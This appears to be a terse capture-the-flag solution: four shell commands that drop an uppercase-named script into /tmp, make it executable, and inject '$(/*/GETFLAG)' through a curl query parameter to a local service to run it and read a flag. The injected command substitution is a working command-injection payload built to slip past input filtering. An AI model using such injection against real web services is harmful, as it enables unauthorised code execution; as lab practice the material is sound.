# cmd
- `echo "getflag>/tmp/flag" > /tmp/GETFLAG`
    - create executable with uppercase
- `chmod 777 /tmp/GETFLAG`
    - give permission
- `curl 'localhost:4646?x=$(/*/GETFLAG)'`
- `cat /tmp/flag`